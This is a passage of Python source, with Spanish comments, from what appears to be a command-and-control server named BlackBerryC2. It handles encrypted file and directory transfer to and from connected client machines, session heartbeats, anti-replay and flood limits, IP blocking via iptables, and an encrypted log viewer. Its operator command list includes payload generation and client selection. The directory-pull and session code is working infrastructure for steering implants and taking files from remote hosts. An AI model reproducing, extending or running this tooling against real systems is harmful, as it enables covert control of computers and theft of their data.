        
    except Exception as e:
        print(f"{ALERT} {RED}Error en send_directory_recursive_to_client: {e}{RESET}")
        logging.exception(f"Error en send_directory: {e}")
        return False

def send_file_in_directory_context_to_client(session, file_path, base_path):
    """
    Envía un archivo al cliente dentro del contexto de transferencia de directorio (para put -r).
    Protocolo: FILE_ITEM → SIZE → chunks
    """
    try:
        sock = session.socket
        aes_key = session.aes_key
        
        file_path = normalize_path(file_path)
        if not file_path or not os.path.isfile(file_path):
            return False
        
        # Calcular ruta relativa
        rel_path = os.path.relpath(file_path, base_path)
        file_size = os.path.getsize(file_path)
        
        # Metadatos del archivo
        file_metadata = {
            "type": "file",
            "path": rel_path,
            "name": os.path.basename(file_path),
            "size": file_size
        }
        
        # Enviar FILE_ITEM con metadatos
        msg = f"FILE_ITEM {json.dumps(file_metadata)}"
        if not send_encrypted_message(sock, msg, aes_key, timeout=10, session=session):
            return False
        
        print(f"{B_CYAN}  → Enviando: {rel_path} ({format_bytes(file_size)}){RESET}")
        
        # Enviar archivo usando la función existente
        timeout = calculate_file_timeout(file_size)
        if not send_file_to_client_direct(session, file_path, timeout=timeout):
            print(f"{ALERT} {RED}  Error enviando {rel_path}{RESET}")
            return False
        
        return True
        
    except Exception as e:
        print(f"{ALERT} {RED}Error enviando archivo en contexto: {e}{RESET}")
        logging.exception(f"Error en send_file_in_directory: {e}")
        return False

def receive_directory_recursive_from_client(session, base_output_dir=None):
    """
    Recibe un directorio completo del cliente de forma recursiva (para get -r).
    Protocolo: DIR_START → FILE_ITEM → SIZE → chunks → DIR_END
    
    IMPORTANTE: Esta función lee directamente del socket y debe coordinarse
    con handle_client() usando el flag session.receiving_directory.
    """
    try:
        sock = session.socket
        aes_key = session.aes_key
        
        # Directorio base para guardar archivos
        if base_output_dir is None:
            base_output_dir = os.path.dirname(os.path.abspath(__file__))
        
        base_output_dir = normalize_path(base_output_dir)
        if not base_output_dir:
            base_output_dir = "."
        
        # Estadísticas
        file_count = 0
        dir_count = 0
        total_bytes = 0
        
        print(f"{B_CYAN}[INFO] Recibiendo directorio en: {base_output_dir}{RESET}")
        
        # Pausa breve para sincronización
        time.sleep(0.1)
        
        while True:
            try:
                # Recibir mensaje con timeout largo
                _, msg = receive_encrypted_message(sock, aes_key, timeout=180)
                if msg is None:
                    print(f"{ALERT} {RED}Error: Timeout o conexión perdida{RESET}")
                    return False
                
                # Ignorar mensajes cortos residuales (como "ok")
                if len(msg) < 10 and msg not in ["DIR_END", "[SUCCESS]", "[ERROR]"]:
                    logging.debug(f"Ignorando mensaje corto residual: {msg}")
                    continue
                
                if msg.startswith("DIR_START "):
                    try:
                        metadata_json = msg[len("DIR_START "):]
                        metadata = json.loads(metadata_json)
                        
                        dir_rel_path = metadata.get("path", "")
                        dir_full_path = os.path.realpath(os.path.join(base_output_dir, dir_rel_path))
                        base_real     = os.path.realpath(base_output_dir)
                        
                        # FIX: path traversal — el directorio debe quedar dentro del base
                        if dir_full_path != base_real and not dir_full_path.startswith(base_real + os.sep):
                            logging.warning(f"[SECURITY] Path traversal bloqueado (DIR_START): {dir_rel_path!r}")
                            continue
                        
                        # Crear directorio
                        os.makedirs(dir_full_path, exist_ok=True)
                        dir_count += 1
                        
                        print(f"{B_CYAN}  Directorio: {dir_rel_path}{RESET}")
                        
                    except Exception as e:
                        print(f"{ALERT} {RED}Error procesando DIR_START: {e}{RESET}")
                        logging.exception(f"Error en DIR_START: {e}")
                        continue
                        
                elif msg.startswith("FILE_ITEM "):
                    try:
                        metadata_json = msg[len("FILE_ITEM "):]
                        metadata = json.loads(metadata_json)
                        
                        file_rel_path = metadata.get("path", "")
                        file_size = metadata.get("size", 0)
                        
                        file_full_path = os.path.realpath(os.path.join(base_output_dir, file_rel_path))
                        base_real      = os.path.realpath(base_output_dir)
                        
                        # FIX: path traversal — el archivo debe quedar dentro del base
                        if not file_full_path.startswith(base_real + os.sep):
                            logging.warning(f"[SECURITY] Path traversal bloqueado (FILE_ITEM): {file_rel_path!r}")
                            continue
                        
                        # Asegurar que el directorio padre existe
                        os.makedirs(os.path.dirname(file_full_path), exist_ok=True)
                        
                        print(f"{B_CYAN}  ← Recibiendo: {file_rel_path} ({format_bytes(file_size)}){RESET}")
                        
                        # Recibir el archivo (SIZE header + chunks)
                        if not receive_file_in_directory_context(sock, aes_key, file_full_path, file_size):
                            print(f"{ALERT} {RED}  Error recibiendo {file_rel_path}{RESET}")
                            continue
                        
                        # Mostrar ruta completa de guardado
                        print(f"{B_GREEN}[+] Guardado: {file_full_path}{RESET}")
                        
                        file_count += 1
                        total_bytes += file_size
                        
                    except Exception as e:
                        print(f"{ALERT} {RED}Error procesando FILE_ITEM: {e}{RESET}")
                        logging.exception(f"Error en FILE_ITEM: {e}")
                        continue
                
                elif msg == "DIR_END":
                    # Fin de un directorio (puede haber más directorios anidados)
                    continue
                    
                elif msg.startswith("[SUCCESS]"):
                    # Transferencia completa
                    print(f"{B_GREEN}[+] Transferencia completa: {dir_count} directorios, {file_count} archivos ({format_bytes(total_bytes)}){RESET}")
                    return True
                    
                elif msg.startswith("[ERROR]"):
                    print(f"{ALERT} {RED}Error reportado por cliente: {msg}{RESET}")
                    return False
                
            except Exception as e:
                logging.exception(f"Error en loop de recepción: {e}")
                continue
        
    except Exception as e:
        print(f"{ALERT} {RED}Error en receive_directory_recursive_from_client: {e}{RESET}")
        logging.exception(f"Error general en receive_directory: {e}")
        return False

def receive_file_in_directory_context(sock, aes_key, file_path, expected_size):
    """
    Recibe un archivo dentro del contexto de transferencia de directorio (para get -r).
    Lee el header SIZE y luego los chunks del archivo.
    """
    try:
        # Recibir header SIZE
        _, size_header = receive_encrypted_message(sock, aes_key, timeout=60)
        if not size_header or not size_header.startswith("SIZE "):
            logging.error(f"Header SIZE esperado, recibido: {size_header}")
            return False
        
        # Parsear SIZE header
        parts = size_header.split()
        if len(parts) < 3:
            logging.error(f"Header SIZE malformado: {size_header}")
            return False
        
        file_size = int(parts[1])
        file_hash_expected = parts[2]
        
        # Verificar tamaño
        if file_size != expected_size:
            logging.warning(f"Tamaño diferente - esperado: {expected_size}, recibido: {file_size}")
        
        # Recibir chunks del archivo
        bytes_received = 0
        file_hash = hashlib.sha256()
        
        with open(file_path, 'wb') as f:
            while bytes_received < file_size:
                remaining = file_size - bytes_received
                timeout = max(30, remaining // (100 * 1024))  # 30s mínimo
                
                try:
                    # Leer longitud del paquete
                    raw_len = recvall(sock, 4, timeout=timeout)
                    if not raw_len:
                        logging.error("Error leyendo longitud del paquete")
                        return False
                    
                    packet_len = struct.unpack('!I', raw_len)[0]
                    
                    # Validar tamaño del paquete
                    if packet_len > 10 * 1024 * 1024:  # Max 10MB
                        logging.error(f"Paquete muy grande: {packet_len} bytes")
                        return False
                    
                    # Leer paquete encriptado
                    encrypted_packet = recvall(sock, packet_len, timeout=timeout)
                    if not encrypted_packet:
                        logging.error("Error leyendo paquete encriptado")
                        return False
                    
                    # Desencriptar
                    aesgcm = AESGCM(aes_key)
                    nonce = encrypted_packet[:12]
                    ciphertext = encrypted_packet[12:]
                    
                    try:
                        chunk_data = aesgcm.decrypt(nonce, ciphertext, None)
                    except Exception as e:
                        logging.error(f"Error desencriptando chunk: {e}")
                        return False
                    
                    # Descomprimir si es necesario
                    if len(chunk_data) > 0:
                        try:
                            # Intentar descomprimir (puede estar comprimido o no)
                            chunk_data = zlib.decompress(chunk_data)
                        except zlib.error:
                            # Si falla, asumir que no está comprimido
                            pass
                    
                    # Escribir al archivo
                    f.write(chunk_data)
                    file_hash.update(chunk_data)
                    bytes_received += len(chunk_data)
                    
                except socket.timeout:
                    logging.error("Timeout recibiendo chunk")
                    return False
                except Exception as e:
                    logging.exception(f"Error recibiendo chunk: {e}")
                    return False
        
        # Verificar hash
        file_hash_actual = file_hash.hexdigest()
        if file_hash_actual != file_hash_expected:
            logging.error(f"Hash mismatch - esperado: {file_hash_expected}, actual: {file_hash_actual}")
            return False
        
        return True
        
    except Exception as e:
        logging.exception(f"Error en receive_file_in_directory_context: {e}")
        return False

# ==================== FIN FUNCIONES DE TRANSFERENCIA RECURSIVA ====================


class AntiReplayTracker:
    """Anti-replay: detecta mensajes duplicados o antiguos"""
    def __init__(self):
        self.expected_seq = 0
        self.received_sequences = deque(maxlen=100)
        self.lock = threading.Lock()
    
    def check_and_update(self, seq_num):
        with self.lock:
            if seq_num in self.received_sequences:
                return False
            if seq_num < self.expected_seq - 100:
                return False
            if seq_num > self.expected_seq + 1000:
                return False
            self.received_sequences.append(seq_num)
            if seq_num >= self.expected_seq:
                self.expected_seq = seq_num + 1
            return True

class ClientSession:
    def __init__(self, socket, address, aes_key, session_id):
        self.socket = socket
        self.address = address
        self.aes_key = aes_key
        self.session_id = session_id
        self.start_time = time.time()
        self.last_heartbeat = time.time()
        self.heartbeat_count = 0
        self.is_interactive = False
        self.command_queue = Queue()
        self.response_queue = Queue(maxsize=MAX_RESPONSE_QUEUE_SIZE)  # FLOOD PROTECTION: Límite de cola
        self.lock = threading.Lock()
        self.bytes_sent = 0
        self.bytes_received = 0
        self.compressed_sent = 0
        self.compressed_received = 0
        self.supports_compression = True
        self.expected_file = None
        self.file_event = threading.Event()
        self.bg_get_lock = threading.Lock()   # solo un GET bg activo a la vez por sesión
        self.file_result = None
        # Ruta final directa donde guardar el archivo en get -r
        # Cuando está establecida, receive_file_stream escribe aquí y omite los prints
        self.expected_file_dest: str | None = None
        self.pending_transfer = False
        self.file_error       = None   # mensaje de error del cliente para bg workers
        self.receiving_directory = False  # Flag para sincronizar transferencias recursivas entrantes
        
        # ── Background transfer control ───────────────────────────────────
        # Cuando True, handle_client deja de leer el socket para que el
        # worker de background tenga acceso exclusivo.
        self.transfer_hijack      = False   # legacy, ya no se usa activamente
        
        # Hostname del cliente
        self.hostname = None
        self.hostname_fetched = False
        self.last_cwd = None   # CWD más reciente del cliente
        
        # Capacidades de compresión
        self.supports_zstd = False
        self.capabilities_negotiated = False
        
        # ==================== SECURITY: Rate limiting de heartbeats ====================
        self.last_heartbeat_time = 0  # Timestamp del último heartbeat procesado
        self.heartbeat_violations = 0  # Contador de violaciones de rate limiting
        
        # ==================== FLOOD PROTECTION ====================
        self.command_timestamps = deque(maxlen=MAX_COMMANDS_PER_SECOND * 2)  # Timestamps de comandos recientes
        self.flood_violations = 0       # Contador de violaciones de flood
        self.messages_dropped = 0
        self.send_sequence = 0
        self.send_lock     = threading.Lock()   # garantiza writes atómicos al socket
        self.anti_replay = AntiReplayTracker()        # Contador de mensajes desechados por overflow
        
    def update_heartbeat(self):
        """Actualizar timestamp y contador de heartbeats de forma thread-safe."""
        try:
            with self.lock:
                self.last_heartbeat = time.time()
                self.heartbeat_count = getattr(self, "heartbeat_count", 0) + 1
        except Exception as e:
            logging.exception(f"Error actualizando heartbeat: {e}")
    
    def is_alive(self):
        try:
            with self.lock:
                return time.time() - self.last_heartbeat < HEARTBEAT_TIMEOUT
        except Exception as e:
            logging.exception(f"Error verificando is_alive: {e}")
            return False
    
    def set_interactive(self, interactive):
        try:
            with self.lock:
                self.is_interactive = interactive
        except Exception as e:
            logging.exception(f"Error en set_interactive: {e}")
    
    def add_bytes_sent(self, count, compressed=False):
        try:
            with self.lock:
                self.bytes_sent += count
                if compressed:
                    self.compressed_sent += count
                    self.supports_compression = True
        except Exception as e:
            logging.exception(f"Error en add_bytes_sent: {e}")
    
    def add_bytes_received(self, count, compressed=False):
        try:
            with self.lock:
                self.bytes_received += count
                if compressed:
                    self.compressed_received += count
                    self.supports_compression = True
        except Exception as e:
            logging.exception(f"Error en add_bytes_received: {e}")
    
    def get_hostname(self):
        """Obtiene el hostname del cliente (con caché)"""
        if self.hostname:
            return self.hostname
        return self.address[0]
    
    def check_command_rate(self):
        """
        Verifica si el cliente está enviando comandos demasiado rápido.
        Returns: (is_flood, commands_per_second)
            is_flood: True si se detecta flood
            commands_per_second: Tasa actual de comandos
        """
        try:
            with self.lock:
                current_time = time.time()
                
                # Agregar timestamp actual
                self.command_timestamps.append(current_time)
                
                # Filtrar timestamps dentro de la ventana de tiempo
                cutoff_time = current_time - COMMAND_FLOOD_WINDOW
                recent_commands = sum(1 for ts in self.command_timestamps if ts >= cutoff_time)
                
                # Calcular tasa de comandos por segundo
                commands_per_second = recent_commands / COMMAND_FLOOD_WINDOW
                
                # Detectar flood
                if commands_per_second > MAX_COMMANDS_PER_SECOND:
                    self.flood_violations += 1
                    return True, commands_per_second
                
                # Reset del contador si está dentro del límite
                if self.flood_violations > 0:
                    self.flood_violations = max(0, self.flood_violations - 1)
                
                return False, commands_per_second
        except Exception as e:
            logging.exception(f"Error en check_command_rate: {e}")
            return False, 0

COMMANDS = [
    "help", "ayuda", "help-proxy", "list", "clients", "select", "report", "ecdhe-keys", 
    "set port", "set host", "generate-payload", "exit", "banner", 
    "payload", "proxy", "stop-proxy", "stop-proxy-gui", "proxy gui", "log", "cert", "new-cert", "cert new", 
    "kill", "block", "unblock", "blocked", 
    "block", "unblock", "blocklist", "sVbanner", "fingerprint", 
    "save-blocklist", "clean", "cd", "E", "e",
    "v", "vv", "all", "proxy-help"
]

# ==================== CUSTOM COMPLETER ====================
class BlackBerryCompleter(Completer):
    """
    Completer personalizado que prioriza comandos del servidor,
    y autocompleta archivos/comandos del sistema si no hay coincidencia.
    """
    def __init__(self, server_commands):
        self.server_commands = server_commands
        self.path_completer = PathCompleter(expanduser=True)
    
    def get_completions(self, document, complete_event):
        text = document.text_before_cursor
        word_before_cursor = document.get_word_before_cursor(WORD=True)
        
        # Primero, intentar completar comandos del servidor
        server_completions = []
        for cmd in self.server_commands:
            if cmd.startswith(word_before_cursor.lower()):
                server_completions.append(
                    Completion(cmd, start_position=-len(word_before_cursor))
                )
        
        # Si hay coincidencias en comandos del servidor, retornar solo esas
        if server_completions:
            for completion in server_completions:
                yield completion
        else:
            # Si no hay coincidencias en comandos del servidor,
            # autocompletar archivos y comandos del sistema
            for completion in self.path_completer.get_completions(document, complete_event):
                yield completion

def validate_ip(ip):
    """Valida formato de dirección IP IPv4 simple."""
    try:
        parts = ip.split('.')
        if len(parts) != 4:
            return False
        for part in parts:
            num = int(part)
            if not 0 <= num <= 255:
                return False
        return True
    except (ValueError, AttributeError) as e:
        logging.debug(f"IP inválida {ip}: {e}")
        return False
    except Exception as e:
        logging.exception(f"Error validando IP {ip}: {e}")
        return False

def load_blocked_ips():
    """Carga la lista de IPs bloqueadas desde archivo con validación."""
    global blocked_ips
    try:
        if os.path.exists(BLOCKED_IPS_FILE):
            with open(BLOCKED_IPS_FILE, 'r', encoding='utf-8') as f:
                import json
                data = json.load(f)
                raw_ips = data.get('blocked_ips', [])
                valid_ips = set()
                for ip in raw_ips:
                    if isinstance(ip, str) and validate_ip(ip):
                        valid_ips.add(ip)
                    else:
                        logging.warning(f"IP inválida ignorada al cargar: {ip}")
                blocked_ips = valid_ips
                logging.info(f"Cargadas {len(blocked_ips)} IPs bloqueadas desde {BLOCKED_IPS_FILE}")
        else:
            blocked_ips = set()
            logging.info("No existe archivo de IPs bloqueadas; iniciando con lista vacía")
    except Exception as e:
        logging.exception(f"Error cargando IPs bloqueadas: {e}")
        blocked_ips = set()

def save_blocked_ips():
    """Guarda la lista de IPs bloqueadas en archivo de forma segura."""
    try:
        import json

        with blocked_ips_lock:
            data = {
                'blocked_ips': list(blocked_ips),
                'last_updated': time.time(),
                'version': '1.0'
            }

            os.makedirs(os.path.dirname(BLOCKED_IPS_FILE), exist_ok=True)

            temp_file = BLOCKED_IPS_FILE + '.tmp'
            with open(temp_file, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)

            os.rename(temp_file, BLOCKED_IPS_FILE)

        logging.info(f"Lista de IPs bloqueadas guardada ({len(blocked_ips)} IPs)")
        return True

    except Exception as e:
        logging.exception(f"Error guardando IPs bloqueadas: {e}")
        return False

def check_iptables_installed():
    """Verifica si iptables está instalado en el sistema."""
    try:
        result = subprocess.run(['which', 'iptables'], 
                              capture_output=True, 
                              text=True, 
                              timeout=5)
        return result.returncode == 0
    except Exception as e:
        logging.debug(f"Error verificando iptables: {e}")
        return False

def install_iptables():
    """Intenta instalar iptables en el sistema."""
    print(f"{B_CYAN}[INFO] Intentando instalar iptables...{RESET}")
    
    package_managers = [
        (['apt-get', 'install', '-y', 'iptables'], 'apt-get'),
        (['yum', 'install', '-y', 'iptables'], 'yum'),
        (['dnf', 'install', '-y', 'iptables'], 'dnf'),
        (['pacman', '-S', '--noconfirm', 'iptables'], 'pacman'),
    ]
    
    try:
        for cmd, name in package_managers:
            try:
                result = subprocess.run(['which', name], 
                                      capture_output=True, 
                                      timeout=5)
                if result.returncode == 0:
                    print(f"{B_CYAN}[INFO] Usando {name} para instalar iptables...{RESET}")
                    install_result = subprocess.run(['sudo'] + cmd, 
                                                  capture_output=True, 
                                                  text=True, 
                                                  timeout=60)
                    if install_result.returncode == 0:
                        print(f"{B_GREEN}[+] iptables instalado exitosamente{RESET}")
                        return True
                    else:
                        print(f"{ALERT} {RED}Error instalando iptables: {install_result.stderr}{RESET}")
                        return False
            except Exception as e:
                logging.debug(f"Error intentando {name}: {e}")
                continue
        
        print(f"{ALERT} {RED}No se pudo detectar un gestor de paquetes compatible{RESET}")
        return False
    except Exception as e:
        logging.exception(f"Error en install_iptables: {e}")
        return False

def block_ip_with_iptables(ip, port=None):
    """Bloquea una IP usando iptables a nivel de firewall."""
    try:
        if not check_iptables_installed():
            print(f"{ALERT} {YELLOW}iptables no está instalado en el sistema{RESET}")
            try:
                install = input(f"{B_CYAN}¿Desea instalar iptables? (s/n): {RESET}").strip().lower()
                if install in ['s', 'si', 'sí', 'y', 'yes']:
                    if not install_iptables():
                        return False
                else:
                    print(f"{B_CYAN}[INFO] Omitiendo bloqueo con iptables{RESET}")
                    return False
            except (KeyboardInterrupt, EOFError):
                print(f"\n{B_CYAN}[INFO] Omitiendo bloqueo con iptables{RESET}")
                return False
        
        check_cmd = ['sudo', 'iptables', '-C', 'INPUT', '-s', ip, '-j', 'DROP']
        if port:
            check_cmd = ['sudo', 'iptables', '-C', 'INPUT', '-s', ip, '-p', 'tcp', '--dport', str(port), '-j', 'DROP']
        
        result = subprocess.run(check_cmd, 
                              capture_output=True, 
                              text=True, 
                              timeout=10)
        
        if result.returncode == 0:
            print(f"{B_YELLOW}[!] La IP {ip} ya está bloqueada en iptables{RESET}")
            return True
        
        if port:
            cmd = ['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-p', 'tcp', '--dport', str(port), '-j', 'DROP']
            print(f"{B_CYAN}[INFO] Bloqueando {ip} en puerto {port} con iptables...{RESET}")
        else:
            cmd = ['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP']
            print(f"{B_CYAN}[INFO] Bloqueando {ip} completamente con iptables...{RESET}")
        
        result = subprocess.run(cmd, 
                              capture_output=True, 
                              text=True, 
                              timeout=10)
        
        if result.returncode == 0:
            print(f"{B_GREEN}[+] IP {ip} bloqueada exitosamente con iptables{RESET}")
            print(f"{B_YELLOW}[!] Para hacer este bloqueo persistente después de reiniciar:{RESET}")
            print(f"    {B_CYAN}sudo iptables-save > /etc/iptables/rules.v4{RESET}")
            return True
        else:
            print(f"{ALERT} {RED}Error bloqueando con iptables: {result.stderr}{RESET}")
            return False
            
    except subprocess.TimeoutExpired:
        logging.error("Timeout ejecutando iptables")
        print(f"{ALERT} {RED}Timeout ejecutando iptables{RESET}")
        return False
    except Exception as e:
        logging.exception(f"Error bloqueando con iptables: {e}")
        print(f"{ALERT} {RED}Error bloqueando con iptables: {e}{RESET}")
        return False

def unblock_ip_from_iptables(ip, port=None):
    """Desbloquea una IP de iptables si está bloqueada."""
    try:
        if not check_iptables_installed():
            logging.debug("iptables no instalado, omitiendo desbloqueo de firewall")
            return False
        
        check_cmd = ['sudo', 'iptables', '-C', 'INPUT', '-s', ip, '-j', 'DROP']
        if port:
            check_cmd = ['sudo', 'iptables', '-C', 'INPUT', '-s', ip, '-p', 'tcp', '--dport', str(port), '-j', 'DROP']
        
        result = subprocess.run(check_cmd, 
                              capture_output=True, 
                              text=True, 
                              timeout=10)
        
        if result.returncode != 0:
            logging.debug(f"La IP {ip} no está bloqueada en iptables")
            return False
        
        if port:
            cmd = ['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-p', 'tcp', '--dport', str(port), '-j', 'DROP']
            print(f"{B_CYAN}[INFO] Desbloqueando {ip} del puerto {port} en iptables...{RESET}")
        else:
            cmd = ['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP']
            print(f"{B_CYAN}[INFO] Desbloqueando {ip} de iptables...{RESET}")
        
        result = subprocess.run(cmd, 
                              capture_output=True, 
                              text=True, 
                              timeout=10)
        
        if result.returncode == 0:
            print(f"{B_GREEN}[+] IP {ip} desbloqueada de iptables{RESET}")
            return True
        else:
            print(f"{ALERT} {RED}Error desbloqueando de iptables: {result.stderr}{RESET}")
            return False
            
    except subprocess.TimeoutExpired:
        logging.error("Timeout ejecutando iptables")
        print(f"{ALERT} {RED}Timeout ejecutando iptables{RESET}")
        return False
    except Exception as e:
        logging.exception(f"Error desbloqueando de iptables: {e}")
        print(f"{ALERT} {RED}Error desbloqueando de iptables: {e}{RESET}")
        return False

def block_ip(ip):
    """Bloquea una IP (persistente) con opción de iptables."""
    try:
        if not validate_ip(ip):
            logging.error(f"Intento de bloqueo con IP inválida: {ip}")
            return False

        with blocked_ips_lock:
            if ip in blocked_ips:
                print(f"{B_YELLOW}[!] IP {ip} ya estaba bloqueada a nivel de aplicación{RESET}")
            else:
                blocked_ips.add(ip)

        if not save_blocked_ips():
            with blocked_ips_lock:
                blocked_ips.discard(ip)
            return False
        
        print(f"{B_GREEN}[+] IP {ip} bloqueada a nivel de aplicación{RESET}")
        logging.warning(f"IP {ip} bloqueada permanentemente en aplicación.")
        
        try:
            use_iptables = input(f"\n{B_CYAN}¿Desea bloquear {ip} también con iptables (firewall del sistema)? (s/n): {RESET}").strip().lower()
            
            if use_iptables in ['s', 'si', 'sí', 'y', 'yes']:
                port_specific = input(f"{B_CYAN}¿Bloquear solo en el puerto {PORT}? (s/n, n=bloqueo total): {RESET}").strip().lower()
                
                if port_specific in ['s', 'si', 'sí', 'y', 'yes']:
                    block_ip_with_iptables(ip, PORT)
                else:
                    block_ip_with_iptables(ip)
        except (KeyboardInterrupt, EOFError):
            print(f"\n{B_CYAN}[INFO] Omitiendo bloqueo con iptables{RESET}")
        
        return True
    except Exception as e:
        logging.exception(f"Error bloqueando IP {ip}: {e}")
        return False

def unblock_ip(ip):
    """Desbloquea una IP persistente Y temporal, verifica iptables."""
    try:
        if not validate_ip(ip):
            logging.error(f"Intento de desbloqueo con IP inválida: {ip}")
            return False

        # Desbloquear de lista persistente
        unblocked_persistent = False
        with blocked_ips_lock:
            if ip in blocked_ips:
                blocked_ips.discard(ip)
                unblocked_persistent = True
                print(f"{B_GREEN}[+] IP {ip} desbloqueada de lista persistente{RESET}")
            else:
                print(f"{B_YELLOW}[!] IP {ip} no estaba en lista persistente{RESET}")
        
        # Desbloquear de bans temporales
        unblocked_temp = False
        with temp_bans_lock:
            if ip in temp_bans:
                del temp_bans[ip]
                unblocked_temp = True
                print(f"{B_GREEN}[+] IP {ip} desbloqueada de bans temporales{RESET}")
            else:
                print(f"{B_YELLOW}[!] IP {ip} no estaba en bans temporales{RESET}")
        
        if unblocked_persistent:
            if not save_blocked_ips():
                with blocked_ips_lock:
                    blocked_ips.add(ip)
                return False
        
        logging.info(f"IP {ip} desbloqueada (persistente: {unblocked_persistent}, temporal: {unblocked_temp})")
        
        # Verificar iptables
        if check_iptables_installed():
            print(f"{B_CYAN}[INFO] Verificando bloqueos en iptables...{RESET}")
            unblocked_port = unblock_ip_from_iptables(ip, PORT)
            unblocked_total = unblock_ip_from_iptables(ip)
            
            if not unblocked_port and not unblocked_total:
                print(f"{B_CYAN}[INFO] La IP {ip} no estaba bloqueada en iptables{RESET}")
        
        return True
    except Exception as e:
        logging.exception(f"Error desbloqueando IP {ip}: {e}")
        return False

def is_ip_blocked(ip):
    """Comprueba si una IP está bloqueada de forma persistente."""
    try:
        with blocked_ips_lock:
            return ip in blocked_ips
    except Exception as e:
        logging.exception(f"Error verificando bloqueo de IP {ip}: {e}")
        return False

def is_ip_temp_banned(ip):
    """Verifica si una IP está bloqueada temporalmente."""
    try:
        with temp_bans_lock:
            if ip in temp_bans:
                if temp_bans[ip] > time.time():
                    return True
                else:
                    del temp_bans[ip]
                    return False
            return False
    except Exception as e:
        logging.exception(f"Error verificando ban temporal de IP {ip}: {e}")
        return False

def is_ip_allowed(ip):
    """Verifica si se permite la conexión desde `ip`."""
    try:
        if not validate_ip(ip):
            log_rejection_smart(ip, "formato inválido")
            return False

        if is_ip_blocked(ip):
            log_rejection_smart(ip, "bloqueo permanente")
            return False

        if is_ip_temp_banned(ip):
            log_rejection_smart(ip, "bloqueo temporal")
            return False

        now = time.time()
        attempts = connection_attempts[ip]
        attempts.append(now)

        while attempts and now - attempts[0] > WINDOW_TIME:
            attempts.popleft()

        if len(attempts) > MAX_ATTEMPTS:
            logging.warning(f"IP {ip} excedió límite de conexiones ({MAX_ATTEMPTS}/{WINDOW_TIME}s).")
            return False

        return True
    except Exception as e:
        logging.exception(f"Error verificando permisos para IP {ip}: {e}")
        return False

# ══════════════════════════════════════════════════════════════════════════════
#  LOG VIEWER — menú interactivo + descifrado integrado
# ══════════════════════════════════════════════════════════════════════════════

def _decrypt_log_line(b64line: str, key: bytes) -> str:
    """Descifra una línea cifrada con AES-256-GCM (nonce[12]+ciphertext)."""
    blob = base64.b64decode(b64line.strip())
    return AESGCM(key).decrypt(blob[:12], blob[12:], None).decode('utf-8')


def _load_log_key_interactive(salt_path: str) -> bytes | None:
    """
    Deriva la clave AES-256 pidiendo la passphrase al usuario.
    Devuelve None si el usuario cancela o la passphrase está vacía.
    """
    if not os.path.exists(salt_path):
        print(f"{YELLOW}[!] Salt no encontrado: {salt_path}{RESET}")
        print(f"{YELLOW}    El log puede no estar cifrado — prueba con [p] plano.{RESET}")
        return None
    with open(salt_path, 'rb') as f:
        salt = f.read()
    if len(salt) != 16:
        print(f"{RED}[!] Salt inválido.{RESET}")
        return None
    try:
        pp = getpass.getpass("    Passphrase del log: ")
    except (KeyboardInterrupt, EOFError):
        print()
        return None
    if not pp.strip():
        return None
    print(f"{YELLOW}[*] Derivando clave (PBKDF2, 600k iter)...{RESET}", end='', flush=True)
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32,
                     salt=salt, iterations=600_000)
    key = kdf.derive(pp.strip().encode('utf-8'))
    print(f"\r{GREEN}[+] Clave derivada.                        {RESET}")
    return key


def _display_log(log_path: str, encrypted: bool, key: bytes | None,
                 tail: int = 0, raw: bool = False) -> bool:
    """
    Lee y muestra un log.
    - encrypted=True → descifra cada línea con key
    - tail > 0       → muestra solo las últimas N líneas
    - raw=True       → imprime sin parsear JSON
    Devuelve True si todo OK, False si hubo errores de descifrado (passphrase incorrecta).
    """
    if not os.path.exists(log_path):
        print(f"{YELLOW}[!] Archivo no encontrado: {log_path}{RESET}")
        return True  # no es error de passphrase

    lines_out = []
    errors = 0
    with open(log_path, 'r', errors='replace') as f:
        raw_lines = [l.rstrip() for l in f if l.strip()]

    if tail > 0:
        raw_lines = raw_lines[-tail:]

    for i, line in enumerate(raw_lines, 1):
        try:
            if encrypted and key:
                line = _decrypt_log_line(line, key)
            if not raw:
                try:
                    rec = json.loads(line)
                    # Colorear según evento
                    evt = rec.get('event', '')
                    ts  = rec.get('ts', '')
                    ip  = rec.get('ip', '')
                    cid = str(rec.get('cid', ''))[:8]
                    if 'connect' in evt:
                        col = GREEN
                    elif 'disconnect' in evt:
                        col = YELLOW
                    elif 'error' in evt or 'FAIL' in evt.upper():
                        col = RED
                    else:
                        col = CYAN
                    line = f"{B_BLACK}{ts}{RESET}  {col}{evt:<18}{RESET}  {ip:<15}  {B_BLACK}{cid}{RESET}"
                    extra = {k: v for k, v in rec.items()
                             if k not in ('ts','event','ip','port','cid','hostname')}
                    if extra:
                        line += f"  {B_BLACK}{json.dumps(extra, ensure_ascii=False)}{RESET}"
                except json.JSONDecodeError:
                    pass  # línea de texto plano (server.log)
            lines_out.append(line)
        except Exception as e:
            errors += 1
            lines_out.append(f"{RED}[ERROR DESCIFRADO línea {i}: passphrase incorrecta]{RESET}")
            if errors > 5:
                lines_out.append(f"{RED}[!] Passphrase incorrecta — abortando visualización{RESET}")
                break

    sep = f"{CYAN}{'─'*72}{RESET}"
    # Solo imprimir si el descifrado fue exitoso o es texto plano
    if errors > 5:
        print(f"\n{RED}  ✗ No se pudo descifrar el log — passphrase incorrecta.{RESET}\n")
        return False

    print(sep)
    print('\n'.join(lines_out) if lines_out else f"{YELLOW}(vacío){RESET}")
    print(sep)
    print(f"{B_BLACK}  {len(lines_out)} líneas  ·  {os.path.basename(log_path)}{RESET}\n")
    return True


def show_logs_menu(passphrase_hint: str | None = None) -> None:
    """
    Menú interactivo de visualización de logs.
    Detecta qué logs existen, si están cifrados, y ofrece opciones.
    """
    log_dir = os.path.join(script_dir, "logs")

    # ── Catálogo de logs conocidos ────────────────────────────────────────────
    KNOWN_LOGS = [
        {
            "label":     "Sessions (conexiones/desconexiones)",
            "file":      "sessions.jsonl",
            "salt":      "sessions.salt",
            "encrypted": _SESSION_LOG_KEY is not None,
            "key":       _SESSION_LOG_KEY,
        },
        {
            "label":     "Server log (eventos, errores)",
            "file":      "BlackBerryC2_enc.log",
            "salt":      "BlackBerryC2_enc.salt",
            "encrypted": True,
            "key":       _SERVER_LOG_KEY,   # clave ya en memoria si el server arrancó con passphrase
        },
        {
